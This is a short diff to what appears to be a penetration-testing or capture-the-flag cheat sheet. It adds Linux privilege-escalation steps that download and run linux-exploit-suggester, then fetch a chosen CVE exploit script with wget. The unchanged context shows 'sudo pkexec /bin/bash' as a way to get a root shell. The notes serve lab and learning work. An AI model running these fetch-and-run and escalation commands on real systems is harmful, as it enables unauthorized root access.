@@ -31,6 +31,11 @@
   - if you are getting the size same of all use filter size and give the size there.
  
 - ## Privilege escalation <a name="privilegeescalation"></a>
+- If It was running on Linux Kernel 4.4.0–31-generic and Ubuntu 14.04.5 LTS. use below command
+  - ```wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh```
+  - ```chmod +x linux-exploit-suggester.sh``` and ```./linux-exploit-suggester.sh```
+  - you will get some CVE, select any one CVE in that download URL will be there using that link you can download scripts
+  - ```wget (download URL in CVE)```
 - if you find ```/usr/bin/pkexec``` in ```sudo -l``` 
   - then use the below command it will give you the root privilege
   - ```sudo pkexec /bin/bash```
